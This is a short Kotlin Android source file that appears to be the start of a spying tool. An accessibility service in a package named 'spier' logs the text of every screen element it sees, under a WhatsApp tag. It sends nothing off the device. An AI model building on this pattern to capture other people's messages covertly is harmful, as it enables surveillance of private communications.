package org.alkaaf.spier

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.widget.Toast

class ServiceWa : AccessibilityService() {
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i("WHATSAPP_G", "Started")
        return super.onStartCommand(intent, flags, startId)
    }

    override fun onInterrupt() {
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i("WHATSAPP_G", "Conected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        var x = event.source
        Log.i("WHATSAPP_G", "" + x.text)
    }
}